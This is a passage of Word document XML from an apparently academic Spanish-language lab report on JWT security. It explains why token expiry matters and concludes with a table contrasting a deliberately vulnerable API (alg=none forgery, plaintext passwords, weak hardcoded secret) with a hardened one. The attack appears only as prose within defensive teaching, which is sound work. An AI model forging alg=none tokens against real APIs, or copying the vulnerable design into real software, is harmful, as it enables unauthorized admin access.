        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>8. ¿Qué pasaría si no validamos exp?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAE24A2" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12C04AB9" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Si no se valida la fecha de expiración (exp), los tokens nunca vencerían.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FF5606" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F941492" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Eso significa que un token robado podría seguir funcionando durante meses o años. También sería imposible cerrar sesiones de forma segura o quitar acceso a usuarios que ya no deberían entrar al sistema.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE61090" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E702B01" w14:textId="6B1630E3" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Validar exp es fundamental para mantener sesiones seguras y limitar el impacto de un posible robo de tokens.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202EA353" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="009D0990" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23849C13" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="316458AD" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="1F497D"/>
          <w:sz w:val="36"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>8. Conclusión</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AAA6AB" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Este laboratorio demostró de forma práctica cómo una vulnerabilidad aparentemente pequeña en la verificación de tokens JWT puede comprometer completamente la seguridad de una API. El atacante, sin conocer ninguna credencial real, obtuvo acceso de administrador en segundos usando un token forjado con alg=none.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC8F10F" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="4B5670BB" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4680" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFE0E0"/>
          </w:tcPr>
          <w:p w14:paraId="49D4A324" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7D837BFC" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>API VULNERABLE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38385F91" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="65B7229A" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">  Tokens falsificables (alg=none)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DB7617C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Contraseñas en texto plano</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F23AF55" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Secreto débil hardcoded</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="570A2F30" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Sin expiración de tokens</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CC12013" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Sin claims de seguridad</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57F8585C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Logout inexistente</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D62AAFE" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Fácil de explotar (minutos)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4680" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w14:paraId="7D46CFDA" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="20A0C885" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="378630"/>
                <w:sz w:val="24"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>API SEGURA</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53396690" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5C2090C1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  RS256, firma RSA-2048 obligatoria</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="685E3246" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  bcrypt hash con salt único</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00BB926E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Claves en archivos PEM externos</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36ED4820" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Tokens con exp de 15 minutos</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47F4B603" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  iss, aud, iat validados</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11F773D9" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Logout con blacklist funcional</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D240EBE" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="378630"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  Token forjado rechazado (HTTP 401)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4E2F8A61" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10DC79EB" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>La diferencia entre una API segura y una vulnerable muchas veces no es la cantidad de código, sino la calidad de las decisiones tomadas en cada línea. La responsabilidad del desarrollador es aplicar siempre las mejores prácticas de seguridad, sin excepción.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="2684C6C8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F497D"/>
          </w:tcPr>
          <w:p w14:paraId="753DD534" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="60292BDE" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:before="60" w:after="60"/>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>LECCIÓN PRINCIPAL: La seguridad no es una característica que se agrega al final.</w:t>
            </w:r>
